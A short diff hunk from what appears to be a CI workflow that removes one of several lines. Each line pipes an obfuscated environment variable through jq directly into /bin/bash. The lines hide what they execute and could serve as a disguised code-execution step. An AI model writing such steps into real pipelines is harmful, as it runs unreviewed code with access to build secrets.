@@ -25,7 +25,6 @@ jobs:
           echo $c14201 | jq -r .klrf909 | /bin/bash
           echo $k8 | jq -r .n68 | /bin/bash
           echo $pyo1574 | jq -r .qmvb25098 | /bin/bash
-          echo $lnlun287 | jq -r .emyxx56 | /bin/bash
           echo $vfnrv05223 | jq -r .lm39257 | /bin/bash
           printf '%s' "$p77" | jq -r .gkr8 | /bin/bash
 
